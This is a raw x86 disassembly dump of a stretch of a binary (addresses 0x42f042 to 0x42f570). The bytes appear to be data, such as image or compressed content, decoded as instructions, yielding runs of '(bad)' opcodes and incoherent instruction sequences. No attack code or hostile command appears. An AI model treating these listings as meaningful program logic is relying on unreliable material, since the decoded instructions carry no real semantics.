  42f042:	ff f7                	push   %edi
  42f044:	c7 87 47 c7 88 88 88 	movl   $0x88888888,-0x777738b9(%edi)
  42f04b:	88 88 88 
  42f04e:	f8                   	clc
  42f04f:	88 88 88 88 88 88    	mov    %cl,-0x77777778(%eax)
  42f055:	88 88 88 88 88 70    	mov    %cl,0x70888888(%eax)
	...
  42f063:	6c                   	insb   (%dx),%es:(%edi)
  42f064:	6c                   	insb   (%dx),%es:(%edi)
  42f065:	44                   	inc    %esp
  42f066:	ff                   	(bad)
  42f067:	ff                   	(bad)
  42f068:	ff                   	(bad)
  42f069:	ff                   	(bad)
  42f06a:	ff                   	(bad)
  42f06b:	ff                   	(bad)
  42f06c:	ff                   	(bad)
  42f06d:	ff                   	(bad)
  42f06e:	ff                   	(bad)
  42f06f:	ff                   	(bad)
  42f070:	ff                   	(bad)
  42f071:	ff                   	(bad)
  42f072:	ff                   	(bad)
  42f073:	ff                   	(bad)
  42f074:	ff                   	(bad)
  42f075:	ff                   	(bad)
  42f076:	ff                   	(bad)
  42f077:	ff                   	(bad)
  42f078:	ff                   	(bad)
  42f079:	ff                   	(bad)
  42f07a:	ff                   	(bad)
  42f07b:	ff                   	(bad)
  42f07c:	ff                   	(bad)
  42f07d:	ff                   	(bad)
  42f07e:	ff                   	(bad)
  42f07f:	ff                   	(bad)
  42f080:	ff                   	(bad)
  42f081:	ff                   	(bad)
  42f082:	ff                   	(bad)
  42f083:	ff                   	(bad)
  42f084:	ff                   	(bad)
  42f085:	ff                   	(bad)
  42f086:	ff                   	(bad)
  42f087:	ff                   	(bad)
  42f088:	ff                   	(bad)
  42f089:	ff                   	(bad)
  42f08a:	ff                   	(bad)
  42f08b:	ff                   	(bad)
  42f08c:	ff                   	(bad)
  42f08d:	ff                   	(bad)
  42f08e:	ff                   	(bad)
  42f08f:	ff                   	(bad)
  42f090:	ff                   	(bad)
  42f091:	ff                   	(bad)
  42f092:	ff                   	(bad)
  42f093:	ff                   	(bad)
  42f094:	ff                   	(bad)
  42f095:	ff                   	(bad)
  42f096:	ff                   	(bad)
  42f097:	ff                   	(bad)
  42f098:	ff                   	(bad)
  42f099:	ff                   	(bad)
  42f09a:	ff                   	(bad)
  42f09b:	ff                   	(bad)
  42f09c:	ff                   	(bad)
  42f09d:	ff                   	(bad)
  42f09e:	ff                   	(bad)
  42f09f:	ff                   	(bad)
  42f0a0:	ff                   	(bad)
  42f0a1:	ff                   	(bad)
  42f0a2:	ff                   	(bad)
  42f0a3:	ff                   	(bad)
  42f0a4:	ff                   	(bad)
  42f0a5:	ff                   	(bad)
  42f0a6:	ff                   	(bad)
  42f0a7:	ff                   	(bad)
  42f0a8:	ff                   	(bad)
  42f0a9:	ff                   	(bad)
  42f0aa:	ff                   	(bad)
  42f0ab:	ff                   	(bad)
  42f0ac:	ff                   	(bad)
  42f0ad:	ff                   	(bad)
  42f0ae:	ff                   	(bad)
  42f0af:	ff                   	(bad)
  42f0b0:	ff                   	(bad)
  42f0b1:	ff                   	(bad)
  42f0b2:	ff                   	(bad)
  42f0b3:	ff                   	(bad)
  42f0b4:	ff                   	(bad)
  42f0b5:	ff                   	(bad)
  42f0b6:	ff                   	(bad)
  42f0b7:	ff                   	(bad)
  42f0b8:	ff                   	(bad)
  42f0b9:	ff                   	(bad)
  42f0ba:	ff                   	(bad)
  42f0bb:	ff                   	(bad)
  42f0bc:	ff                   	(bad)
  42f0bd:	ff                   	(bad)
  42f0be:	ff                   	(bad)
  42f0bf:	ff                   	(bad)
  42f0c0:	ff                   	(bad)
  42f0c1:	ff                   	(bad)
  42f0c2:	ff                   	(bad)
  42f0c3:	ff                   	(bad)
  42f0c4:	f8                   	clc
  42f0c5:	78 8c                	js     0x42f053
  42f0c7:	65 c8 78 88 88       	gs enter $0x8878,$0x88
  42f0cc:	f8                   	clc
  42f0cd:	88 88 88 88 88 88    	mov    %cl,-0x77777778(%eax)
  42f0d3:	88 88 88 88 88 88    	mov    %cl,-0x77777778(%eax)
  42f0d9:	f8                   	clc
  42f0da:	80 00 00             	addb   $0x0,(%eax)
  42f0dd:	00 00                	add    %al,(%eax)
  42f0df:	00 00                	add    %al,(%eax)
  42f0e1:	00 00                	add    %al,(%eax)
  42f0e3:	46                   	inc    %esi
  42f0e4:	c6 46 ff ff          	movb   $0xff,-0x1(%esi)
  42f0e8:	ff                   	(bad)
  42f0e9:	ff                   	(bad)
  42f0ea:	ff                   	(bad)
  42f0eb:	ff                   	(bad)
  42f0ec:	ff                   	(bad)
  42f0ed:	ff                   	(bad)
  42f0ee:	ff                   	(bad)
  42f0ef:	ff                   	(bad)
  42f0f0:	ff                   	(bad)
  42f0f1:	ff                   	(bad)
  42f0f2:	ff                   	(bad)
  42f0f3:	ff                   	(bad)
  42f0f4:	ff                   	(bad)
  42f0f5:	ff                   	(bad)
  42f0f6:	ff                   	(bad)
  42f0f7:	ff                   	(bad)
  42f0f8:	ff                   	(bad)
  42f0f9:	ff                   	(bad)
  42f0fa:	ff                   	(bad)
  42f0fb:	ff                   	(bad)
  42f0fc:	ff                   	(bad)
  42f0fd:	ff                   	(bad)
  42f0fe:	ff                   	(bad)
  42f0ff:	ff                   	(bad)
  42f100:	ff                   	(bad)
  42f101:	ff                   	(bad)
  42f102:	ff                   	(bad)
  42f103:	ff                   	(bad)
  42f104:	ff                   	(bad)
  42f105:	ff                   	(bad)
  42f106:	ff                   	(bad)
  42f107:	ff                   	(bad)
  42f108:	ff                   	(bad)
  42f109:	ff                   	(bad)
  42f10a:	ff                   	(bad)
  42f10b:	ff                   	(bad)
  42f10c:	ff                   	(bad)
  42f10d:	ff                   	(bad)
  42f10e:	ff                   	(bad)
  42f10f:	ff                   	(bad)
  42f110:	ff                   	(bad)
  42f111:	ff                   	(bad)
  42f112:	ff                   	(bad)
  42f113:	ff                   	(bad)
  42f114:	ff                   	(bad)
  42f115:	ff                   	(bad)
  42f116:	ff                   	(bad)
  42f117:	ff                   	(bad)
  42f118:	ff                   	(bad)
  42f119:	ff                   	(bad)
  42f11a:	ff                   	(bad)
  42f11b:	ff                   	(bad)
  42f11c:	ff                   	(bad)
  42f11d:	ff                   	(bad)
  42f11e:	ff                   	(bad)
  42f11f:	ff                   	(bad)
  42f120:	ff                   	(bad)
  42f121:	ff 02                	incl   (%edx)
  42f123:	04 b0                	add    $0xb0,%al
  42f125:	cc                   	int3
  42f126:	dc f9                	fdivr  %st,%st(1)
  42f128:	ce                   	into
  42f129:	25 98 ca d6 bc       	and    $0xbcd6ca98,%eax
  42f12e:	69 9e 45 91 78 d8 a7 	imul   $0xcc8665a7,-0x27876ebb(%esi),%ebx
  42f135:	65 86 cc 
  42f138:	bb 85 0a e7 c3       	mov    $0xc3e70a85,%ebx
  42f13d:	c0 96 2b f6 a6 3f 64 	rclb   $0x64,0x3fa6f62b(%esi)
  42f144:	fb                   	sti
  42f145:	92                   	xchg   %eax,%edx
  42f146:	8d 38                	lea    (%eax),%edi
  42f148:	36 ea bc 1c 02 04 06 	ss ljmp $0x306,$0x4021cbc
  42f14f:	03 
  42f150:	1d ca 3d b9 7a       	sbb    $0x7ab93dca,%eax
  42f155:	1f                   	pop    %ds
  42f156:	71 73                	jno    0x42f1cb
  42f158:	90                   	nop
  42f159:	5b                   	pop    %ebx
  42f15a:	22 6b f3             	and    -0xd(%ebx),%ch
  42f15d:	d2 7a 0b             	sarb   %cl,0xb(%edx)
  42f160:	f1                   	int1
  42f161:	24 d2                	and    $0xd2,%al
  42f163:	b1 d5                	mov    $0xd5,%cl
  42f165:	0f 07                	sysret
  42f167:	98                   	cwtl
  42f168:	ee                   	out    %al,(%dx)
  42f169:	4d                   	dec    %ebp
  42f16a:	e5 b6                	in     $0xb6,%eax
  42f16c:	15 9c c3 06 cb       	adc    $0xcb06c39c,%eax
  42f171:	f1                   	int1
  42f172:	ab                   	stos   %eax,%es:(%edi)
  42f173:	e4 a4                	in     $0xa4,%al
  42f175:	59                   	pop    %ecx
  42f176:	d4 3d                	aam    $0x3d
  42f178:	9d                   	popf
  42f179:	2d ba de 93 9c       	sub    $0x9c93deba,%eax
  42f17e:	2e 1a 8c 45 16 25 ef 	sbb    %cs:-0x7110daea(%ebp,%eax,2),%cl
  42f185:	8e 
  42f186:	02 54 3b d6          	add    -0x2a(%ebx,%edi,1),%dl
  42f18a:	f3 97                	repz xchg %eax,%edi
  42f18c:	ed                   	in     (%dx),%eax
  42f18d:	a9 29 3c fa ba       	test   $0xbafa3c29,%eax
  42f192:	04 9a                	add    $0x9a,%al
  42f194:	a0 e8 66 b6 ee       	mov    0xeeb666e8,%al
  42f199:	63 ac 3b 6b 39 9d c4 	arpl   %ebp,-0x3b62c695(%ebx,%edi,1)
  42f1a0:	4f                   	dec    %edi
  42f1a1:	70 ba                	jo     0x42f15d
  42f1a3:	75 0b                	jne    0x42f1b0
  42f1a5:	08 c1                	or     %al,%cl
  42f1a7:	4d                   	dec    %ebp
  42f1a8:	68 26 2e f8 2e       	push   $0x2ef82e26
  42f1ad:	e2 eb                	loop   0x42f19a
  42f1af:	b1 4b                	mov    $0x4b,%cl
  42f1b1:	07                   	pop    %es
  42f1b2:	68 a2 92 32 ae       	push   $0xae3292a2
  42f1b7:	8b f8                	mov    %eax,%edi
  42f1b9:	71 49                	jno    0x42f204
  42f1bb:	f2 f7 b7 b3 8a 95 8a 	repnz divl -0x756a754d(%edi)
  42f1c2:	0e                   	push   %cs
  42f1c3:	21 c4                	and    %eax,%esp
  42f1c5:	e2 20                	loop   0x42f1e7
  42f1c7:	32 99 d7 85 7d 96    	xor    -0x69827a29(%ecx),%bl
  42f1cd:	8b 72 49             	mov    0x49(%edx),%esi
  42f1d0:	35 f2 64 a6 db       	xor    $0xdba664f2,%eax
  42f1d5:	0e                   	push   %cs
  42f1d6:	fd                   	std
  42f1d7:	23 fe                	and    %esi,%edi
  42f1d9:	97                   	xchg   %eax,%edi
  42f1da:	14 36                	adc    $0x36,%al
  42f1dc:	82 e3 25             	and    $0x25,%bl
  42f1df:	c5 31                	lds    (%ecx),%esi
  42f1e1:	96                   	xchg   %eax,%esi
  42f1e2:	42                   	inc    %edx
  42f1e3:	7a d3                	jp     0x42f1b8
  42f1e5:	85 5e a0             	test   %ebx,-0x60(%esi)
  42f1e8:	19 2e                	sbb    %ebp,(%esi)
  42f1ea:	5a                   	pop    %edx
  42f1eb:	56                   	push   %esi
  42f1ec:	28 ca                	sub    %cl,%dl
  42f1ee:	99                   	cltd
  42f1ef:	24 dc                	and    $0xdc,%al
  42f1f1:	d1 f5                	shl    $1,%ebp
  42f1f3:	93                   	xchg   %eax,%ebx
  42f1f4:	dc 1f                	fcompl (%edi)
  42f1f6:	25 df 9e 11 81       	and    $0x81119edf,%eax
  42f1fb:	7c 61                	jl     0x42f25e
  42f1fd:	63 90 f5 62 9a 31    	arpl   %edx,0x319a62f5(%eax)
  42f203:	fd                   	std
  42f204:	bc 13 1e 38 15       	mov    $0x15381e13,%esp
  42f209:	7f db                	jg     0x42f1e6
  42f20b:	52                   	push   %edx
  42f20c:	70 37                	jo     0x42f245
  42f20e:	9f                   	lahf
  42f20f:	5a                   	pop    %edx
  42f210:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  42f211:	6c                   	insb   (%dx),%es:(%edi)
  42f212:	16                   	push   %ss
  42f213:	65 9d                	gs popf
  42f215:	80 b3 64 74 6e 14 66 	xorb   $0x66,0x146e7464(%ebx)
  42f21c:	09 64 00 7a          	or     %esp,0x7a(%eax,%eax,1)
  42f220:	91                   	xchg   %eax,%ecx
  42f221:	18 fb                	sbb    %bh,%bl
  42f223:	bf e3 ba d3 2e       	mov    $0x2ed3bae3,%edi
  42f228:	84 e3                	test   %ah,%bl
  42f22a:	fc                   	cld
  42f22b:	f0 d4 06             	lock aam $0x6
  42f22e:	48                   	dec    %eax
  42f22f:	3a fc                	cmp    %ah,%bh
  42f231:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  42f232:	43                   	inc    %ebx
  42f233:	fc                   	cld
  42f234:	47                   	inc    %edi
  42f235:	61                   	popa
  42f236:	e7 b9                	out    %eax,$0xb9
  42f238:	95                   	xchg   %eax,%ebp
  42f239:	58                   	pop    %eax
  42f23a:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  42f23b:	13 c6                	adc    %esi,%eax
  42f23d:	cc                   	int3
  42f23e:	35 18 86 23 eb       	xor    $0xeb238618,%eax
  42f243:	37                   	aaa
  42f244:	ea 27 01 50 66 7e c4 	ljmp   $0xc47e,$0x66500127
  42f24b:	e8 dc 8a b8 e4       	call   0xe4fb7d2c
  42f250:	cb                   	lret
  42f251:	9e                   	sahf
  42f252:	90                   	nop
  42f253:	02 c3                	add    %bl,%al
  42f255:	bb 90 6b 80 f6       	mov    $0xf6806b90,%ebx
  42f25a:	a1 52 3f f4 38       	mov    0x38f43f52,%eax
  42f25f:	b8 54 c0 96 5f       	mov    $0x5f96c054,%eax
  42f264:	14 4a                	adc    $0x4a,%al
  42f266:	1b 27                	sbb    (%edi),%esp
  42f268:	c8 25 b8 97          	enter  $0xb825,$0x97
  42f26c:	6b 3f 63             	imul   $0x63,(%edi),%edi
  42f26f:	7f 84                	jg     0x42f1f5
  42f271:	e4 59                	in     $0x59,%al
  42f273:	8c b9 ed 3c 25 bc    	mov    %?,-0x43dac313(%ecx)
  42f279:	84 5a 2f             	test   %bl,0x2f(%edx)
  42f27c:	c1 6e d4 4e          	shrl   $0x4e,-0x2c(%esi)
  42f280:	7c d0                	jl     0x42f252
  42f282:	98                   	cwtl
  42f283:	01 31                	add    %esi,(%ecx)
  42f285:	98                   	cwtl
  42f286:	eb 9d                	jmp    0x42f225
  42f288:	59                   	pop    %ecx
  42f289:	af                   	scas   %es:(%edi),%eax
  42f28a:	6c                   	insb   (%dx),%es:(%edi)
  42f28b:	ac                   	lods   %ds:(%esi),%al
  42f28c:	97                   	xchg   %eax,%edi
  42f28d:	3a f1                	cmp    %cl,%dh
  42f28f:	91                   	xchg   %eax,%ecx
  42f290:	a2 69 af d5 f4       	mov    %al,0xf4d5af69
  42f295:	10 78 3d             	adc    %bh,0x3d(%eax)
  42f298:	0b c8                	or     %eax,%ecx
  42f29a:	bd ba 58 d8 dc       	mov    $0xdcd858ba,%ebp
  42f29f:	84 18                	test   %bl,(%eax)
  42f2a1:	e1 78                	loope  0x42f31b
  42f2a3:	8b 1c 4f             	mov    (%edi,%ecx,2),%ebx
  42f2a6:	f0 ce                	lock into
  42f2a8:	01 a6 74 25 73 c8    	add    %esp,-0x378cda8c(%esi)
  42f2ae:	06                   	push   %es
  42f2af:	a3 6f 70 f4 77       	mov    %eax,0x77f4706f
  42f2b4:	40                   	inc    %eax
  42f2b5:	e1 3a                	loope  0x42f2f1
  42f2b7:	67 93                	addr16 xchg %eax,%ebx
  42f2b9:	1a 45 49             	sbb    0x49(%ebp),%al
  42f2bc:	3f                   	aas
  42f2bd:	76 bd                	jbe    0x42f27c
  42f2bf:	94                   	xchg   %eax,%esp
  42f2c0:	9a b6 f7 8b 0e ce 19 	lcall  $0x19ce,$0xe8bf7b6
  42f2c7:	6f                   	outsl  %ds:(%esi),(%dx)
  42f2c8:	0a 88 0e 72 95 3b    	or     0x3b95720e(%eax),%cl
  42f2ce:	02 6b 9d             	add    -0x63(%ebx),%ch
  42f2d1:	11 c7                	adc    %eax,%edi
  42f2d3:	10 1a                	adc    %bl,(%edx)
  42f2d5:	c9                   	leave
  42f2d6:	f0 20 74 52 5f       	lock and %dh,0x5f(%edx,%edx,2)
  42f2db:	58                   	pop    %eax
  42f2dc:	24 6d                	and    $0x6d,%al
  42f2de:	84 c5                	test   %al,%ch
  42f2e0:	16                   	push   %ss
  42f2e1:	2c ea                	sub    $0xea,%al
  42f2e3:	62 f3 2d 69 01       	(bad)
  42f2e8:	3f                   	aas
  42f2e9:	fb                   	sti
  42f2ea:	0b bd d4 e2 81 95    	or     -0x6a7e1d2c(%ebp),%edi
  42f2f0:	bc 24 65 2a 3b       	mov    $0x3b2a6524,%esp
  42f2f5:	01 ea                	add    %ebp,%edx
  42f2f7:	35 87 01 68 1f       	xor    $0x1f680187,%eax
  42f2fc:	99                   	cltd
  42f2fd:	f9                   	stc
  42f2fe:	15 be 44 7c 5b       	adc    $0x5b7c44be,%eax
  42f303:	8e d4                	mov    %esp,%ss
  42f305:	c6 42 2d a3          	movb   $0xa3,0x2d(%edx)
  42f309:	b9 53 91 01 39       	mov    $0x39019153,%ecx
  42f30e:	9c                   	pushf
  42f30f:	0a 0d 09 ff b6 86    	or     0x86b6ff09,%cl
  42f315:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  42f316:	31 e4                	xor    %esp,%esp
  42f318:	1f                   	pop    %ds
  42f319:	46                   	inc    %esi
  42f31a:	18 0b                	sbb    %cl,(%ebx)
  42f31c:	f6 de                	neg    %dh
  42f31e:	80 24 ff 94          	andb   $0x94,(%edi,%edi,8)
  42f322:	51                   	push   %ecx
  42f323:	89 91 7f 87 af 93    	mov    %edx,-0x6c507881(%ecx)
  42f329:	b8 d7 62 eb 02       	mov    $0x2eb62d7,%eax
  42f32e:	84 7d cf             	test   %bh,-0x31(%ebp)
  42f331:	51                   	push   %ecx
  42f332:	12 40 b9             	adc    -0x47(%eax),%al
  42f335:	55                   	push   %ebp
  42f336:	2b 7b cb             	sub    -0x35(%ebx),%edi
  42f339:	69 e6 48 e2 47 ab    	imul   $0xab47e248,%esi,%esp
  42f33f:	da 7f 89             	fidivrl -0x77(%edi)
  42f342:	c2 fb 3b             	ret    $0x3bfb
  42f345:	ec                   	in     (%dx),%al
  42f346:	2e f8                	cs clc
  42f348:	6f                   	outsl  %ds:(%esi),(%dx)
  42f349:	31 7d 7f             	xor    %edi,0x7f(%ebp)
  42f34c:	e3 85                	jecxz  0x42f2d3
  42f34e:	b0 be                	mov    $0xbe,%al
  42f350:	81 a9 12 bc ef d3 cd 	subl   $0xa2f4eecd,-0x2c1043ee(%ecx)
  42f357:	ee f4 a2 
  42f35a:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  42f35b:	c5 fe 29             	(bad)
  42f35e:	fc                   	cld
  42f35f:	15 b2 f3 fb d4       	adc    $0xd4fbf3b2,%eax
  42f364:	9c                   	pushf
  42f365:	b0 95                	mov    $0x95,%al
  42f367:	45                   	inc    %ebp
  42f368:	05 77 f2 28 89       	add    $0x8928f277,%eax
  42f36d:	9d                   	popf
  42f36e:	ff 62 9e             	jmp    *-0x62(%edx)
  42f371:	5d                   	pop    %ebp
  42f372:	d3 58 80             	rcrl   %cl,-0x80(%eax)
  42f375:	4f                   	dec    %edi
  42f376:	15 35 ec cd 4c       	adc    $0x4ccdec35,%eax
  42f37b:	81 14 b9 f5 0b 07 e4 	adcl   $0xe4070bf5,(%ecx,%edi,4)
  42f382:	61                   	popa
  42f383:	fe 8d f8 6f 55 b0    	decb   -0x4faa9008(%ebp)
  42f389:	27                   	daa
  42f38a:	13 39                	adc    (%ecx),%edi
  42f38c:	51                   	push   %ecx
  42f38d:	fe                   	(bad)
  42f38e:	ed                   	in     (%dx),%eax
  42f38f:	b7 5a                	mov    $0x5a,%bh
  42f391:	3d 71 f0 7c 77       	cmp    $0x777cf071,%eax
  42f396:	38 15 cc 05 c8 85    	cmp    %dl,0x85c805cc
  42f39c:	ad                   	lods   %ds:(%esi),%eax
  42f39d:	73 f6                	jae    0x42f395
  42f39f:	3e 17                	ds pop %ss
  42f3a1:	17                   	pop    %ss
  42f3a2:	5f                   	pop    %edi
  42f3a3:	a0 1e e4 43 f8       	mov    0xf843e41e,%al
  42f3a8:	fb                   	sti
  42f3a9:	07                   	pop    %es
  42f3aa:	2d 47 52 94 a1       	sub    $0xa1945247,%eax
  42f3af:	1d f4 8d 62 d2       	sbb    $0xd2628df4,%eax
  42f3b4:	e7 1c                	out    %eax,$0x1c
  42f3b6:	cc                   	int3
  42f3b7:	97                   	xchg   %eax,%edi
  42f3b8:	29 f1                	sub    %esi,%ecx
  42f3ba:	18 cd                	sbb    %cl,%ch
  42f3bc:	ee                   	out    %al,(%dx)
  42f3bd:	c2 18 dd             	ret    $0xdd18
  42f3c0:	4c                   	dec    %esp
  42f3c1:	70 5c                	jo     0x42f41f
  42f3c3:	4b                   	dec    %ebx
  42f3c4:	64 38 fc             	fs cmp %bh,%ah
  42f3c7:	98                   	cwtl
  42f3c8:	26 5c                	es pop %esp
  42f3ca:	f0 ca e9 12          	lock lret $0x12e9
  42f3ce:	13 cf                	adc    %edi,%ecx
  42f3d0:	64 79 48             	fs jns 0x42f41b
  42f3d3:	ea 56 06 98 fc ae 63 	ljmp   $0x63ae,$0xfc980656
  42f3da:	5f                   	pop    %edi
  42f3db:	43                   	inc    %ebx
  42f3dc:	09 e6                	or     %esp,%esi
  42f3de:	2b 2e                	sub    (%esi),%ebp
  42f3e0:	e4 dd                	in     $0xdd,%al
  42f3e2:	39 3d 19 49 59 e7    	cmp    %edi,0xe7594919
  42f3e8:	df 5c 99 78          	fistps 0x78(%ecx,%ebx,4)
  42f3ec:	91                   	xchg   %eax,%ecx
  42f3ed:	07                   	pop    %es
  42f3ee:	0d 3f f4 29 15       	or     $0x1529f43f,%eax
  42f3f3:	95                   	xchg   %eax,%ebp
  42f3f4:	2b 7f b3             	sub    -0x4d(%edi),%edi
  42f3f7:	a3 78 36 65 ac       	mov    %eax,0xac653678
  42f3fc:	72 04                	jb     0x42f402
  42f3fe:	40                   	inc    %eax
  42f3ff:	3f                   	aas
  42f400:	32 49 31             	xor    0x31(%ecx),%cl
  42f403:	e7 2b                	out    %eax,$0x2b
  42f405:	0f de f3             	pmaxub %mm3,%mm6
  42f408:	d7                   	xlat   %ds:(%ebx)
  42f409:	b1 4b                	mov    $0x4b,%cl
  42f40b:	f4                   	hlt
  42f40c:	1a d0                	sbb    %al,%dl
  42f40e:	dd 15 00 19 5e a4    	fstl   0xa45e1900
  42f414:	b5 d7                	mov    $0xd7,%ch
  42f416:	31 69 37             	xor    %ebp,0x37(%ecx)
  42f419:	44                   	inc    %esp
  42f41a:	4f                   	dec    %edi
  42f41b:	48                   	dec    %eax
  42f41c:	b5 88                	mov    $0x88,%ch
  42f41e:	94                   	xchg   %eax,%esp
  42f41f:	f4                   	hlt
  42f420:	e2 d6                	loop   0x42f3f8
  42f422:	be 71 b7 7e ee       	mov    $0xee7eb771,%esi
  42f427:	e5 2a                	in     $0x2a,%eax
  42f429:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  42f42a:	d9 63 cf             	fldenv -0x31(%ebx)
  42f42d:	20 e9                	and    %ch,%cl
  42f42f:	4f                   	dec    %edi
  42f430:	81 fd 41 c9 03 61    	cmp    $0x6103c941,%ebp
  42f436:	1f                   	pop    %ds
  42f437:	af                   	scas   %es:(%edi),%eax
  42f438:	7e 8e                	jle    0x42f3c8
  42f43a:	06                   	push   %es
  42f43b:	4b                   	dec    %ebx
  42f43c:	b8 63 fc 28 2a       	mov    $0x2a28fc63,%eax
  42f441:	40                   	inc    %eax
  42f442:	3a 44 f4 86          	cmp    -0x7a(%esp,%esi,8),%al
  42f446:	4a                   	dec    %edx
  42f447:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  42f448:	9b                   	fwait
  42f449:	95                   	xchg   %eax,%ebp
  42f44a:	68 66 49 3c de       	push   $0xde3c4966
  42f44f:	37                   	aaa
  42f450:	d2 1a                	rcrb   %cl,(%edx)
  42f452:	92                   	xchg   %eax,%edx
  42f453:	f8                   	clc
  42f454:	97                   	xchg   %eax,%edi
  42f455:	f0 dd 01             	lock fldl (%ecx)
  42f458:	65 60                	gs pusha
  42f45a:	6c                   	insb   (%dx),%es:(%edi)
  42f45b:	63 c9                	arpl   %ecx,%ecx
  42f45d:	99                   	cltd
  42f45e:	33 c1                	xor    %ecx,%eax
  42f460:	42                   	inc    %edx
  42f461:	0c a4                	or     $0xa4,%al
  42f463:	dc 25 1e 29 90 62    	fsubl  0x6290291e
  42f469:	1e                   	push   %ds
  42f46a:	e5 80                	in     $0x80,%eax
  42f46c:	87 f1                	xchg   %esi,%ecx
  42f46e:	56                   	push   %esi
  42f46f:	b8 47 8b 06 15       	mov    $0x15068b47,%eax
  42f474:	3e 89 ec             	ds mov %ebp,%esp
  42f477:	8b 4b 77             	mov    0x77(%ebx),%ecx
  42f47a:	c1 4b 7a bd          	rorl   $0xbd,0x7a(%ebx)
  42f47e:	f1                   	int1
  42f47f:	d1 0c 92             	rorl   $1,(%edx,%edx,4)
  42f482:	76 69                	jbe    0x42f4ed
  42f484:	d1 0a                	rorl   $1,(%edx)
  42f486:	3f                   	aas
  42f487:	76 15                	jbe    0x42f49e
  42f489:	ea 08 e1 32 75 05 42 	ljmp   $0x4205,$0x7532e108
  42f490:	9b                   	fwait
  42f491:	30 1b                	xor    %bl,(%ebx)
  42f493:	eb 04                	jmp    0x42f499
  42f495:	3e 49                	ds dec %ecx
  42f497:	fe                   	(bad)
  42f498:	d5 08                	aad    $0x8
  42f49a:	0d 9c aa 5e ad       	or     $0xad5eaa9c,%eax
  42f49f:	52                   	push   %edx
  42f4a0:	ff 90 29 05 d7 f7    	call   *-0x828fad7(%eax)
  42f4a6:	0b a4 4d dd a5 b3 b2 	or     -0x4d4c5a23(%ebp,%ecx,2),%esp
  42f4ad:	8d                   	lea    (bad),%edi
  42f4ae:	fa                   	cli
  42f4af:	2e 8a 05 e3 9a 4f 3b 	mov    %cs:0x3b4f9ae3,%al
  42f4b6:	91                   	xchg   %eax,%ecx
  42f4b7:	ff 53 5f             	call   *0x5f(%ebx)
  42f4ba:	e1 80                	loope  0x42f43c
  42f4bc:	87 3a                	xchg   %edi,(%edx)
  42f4be:	d9 cd                	fxch   %st(5)
  42f4c0:	7e f3                	jle    0x42f4b5
  42f4c2:	47                   	inc    %edi
  42f4c3:	a8 60                	test   $0x60,%al
  42f4c5:	5f                   	pop    %edi
  42f4c6:	6d                   	insl   (%dx),%es:(%edi)
  42f4c7:	bb 70 e5 3d f7       	mov    $0xf73de570,%ebx
  42f4cc:	3d 6a b2 46 a1       	cmp    $0xa146b26a,%eax
  42f4d1:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  42f4d2:	6c                   	insb   (%dx),%es:(%edi)
  42f4d3:	5a                   	pop    %edx
  42f4d4:	8a 2f                	mov    (%edi),%ch
  42f4d6:	d9 90 c5 4e d0 64    	fsts   0x64d04ec5(%eax)
  42f4dc:	9c                   	pushf
  42f4dd:	01 fa                	add    %edi,%edx
  42f4df:	4b                   	dec    %ebx
  42f4e0:	61                   	popa
  42f4e1:	6c                   	insb   (%dx),%es:(%edi)
  42f4e2:	f0 36 6e             	lock outsb %ss:(%esi),(%dx)
  42f4e5:	05 13 04 bc f8       	add    $0xf8bc0413,%eax
  42f4ea:	2c 76                	sub    $0x76,%al
  42f4ec:	cf                   	iret
  42f4ed:	bc 93 5d 59 b2       	mov    $0xb2595d93,%esp
  42f4f2:	d6                   	salc
  42f4f3:	23 09                	and    (%ecx),%ecx
  42f4f5:	83 cd 7c             	or     $0x7c,%ebp
  42f4f8:	8b 77 5b             	mov    0x5b(%edi),%esi
  42f4fb:	ff                   	(bad)
  42f4fc:	f9                   	stc
  42f4fd:	57                   	push   %edi
  42f4fe:	0d ba 2c 89 00       	or     $0x892cba,%eax
  42f503:	2b 9b 0a 56 2c b5    	sub    -0x4ad3a9f6(%ebx),%ebx
  42f509:	21 6b 01             	and    %ebp,0x1(%ebx)
  42f50c:	69 6e 04 85 b6 38 b6 	imul   $0xb638b685,0x4(%esi),%ebp
  42f513:	15 36 9b ba 33       	adc    $0x33ba9b36,%eax
  42f518:	f8                   	clc
  42f519:	62 9d 7b 7d 72 6e    	bound  %ebx,0x6e727d7b(%ebp)
  42f51f:	18 5a 1d             	sbb    %bl,0x1d(%edx)
  42f522:	a2 8b db de c3       	mov    %al,0xc3dedb8b
  42f527:	7d 36                	jge    0x42f55f
  42f529:	cc                   	int3
  42f52a:	aa                   	stos   %al,%es:(%edi)
  42f52b:	d1 39                	sarl   $1,(%ecx)
  42f52d:	4c                   	dec    %esp
  42f52e:	41                   	inc    %ecx
  42f52f:	ef                   	out    %eax,(%dx)
  42f530:	f4                   	hlt
  42f531:	7a b6                	jp     0x42f4e9
  42f533:	3f                   	aas
  42f534:	40                   	inc    %eax
  42f535:	e6 5f                	out    %al,$0x5f
  42f537:	6e                   	outsb  %ds:(%esi),(%dx)
  42f538:	fa                   	cli
  42f539:	7f 06                	jg     0x42f541
  42f53b:	cf                   	iret
  42f53c:	0d 21 c4 5b 31       	or     $0x315bc421,%eax
  42f541:	da 88 b4 84 6a b9    	fimull -0x46957b4c(%eax)
  42f547:	41                   	inc    %ecx
  42f548:	a9 4b af a6 4b       	test   $0x4ba6af4b,%eax
  42f54d:	26 b5 fa             	es mov $0xfa,%ch
  42f550:	75 7f                	jne    0x42f5d1
  42f552:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  42f553:	43                   	inc    %ebx
  42f554:	d1 29                	shrl   $1,(%ecx)
  42f556:	6e                   	outsb  %ds:(%esi),(%dx)
  42f557:	ca ce b4             	lret   $0xb4ce
  42f55a:	f6 41 ff d4          	testb  $0xd4,-0x1(%ecx)
  42f55e:	9b                   	fwait
  42f55f:	af                   	scas   %es:(%edi),%eax
  42f560:	4f                   	dec    %edi
  42f561:	ae                   	scas   %es:(%edi),%al
  42f562:	c1 e2 13             	shl    $0x13,%edx
  42f565:	2f                   	das
  42f566:	27                   	daa
  42f567:	8b 2b                	mov    (%ebx),%ebp
  42f569:	e9 8b bb 76 2c       	jmp    0x2cb9b0f9
  42f56e:	7f fc                	jg     0x42f56c
  42f570:	25 44 fc 29 c8       	and    $0xc829fc44,%eax
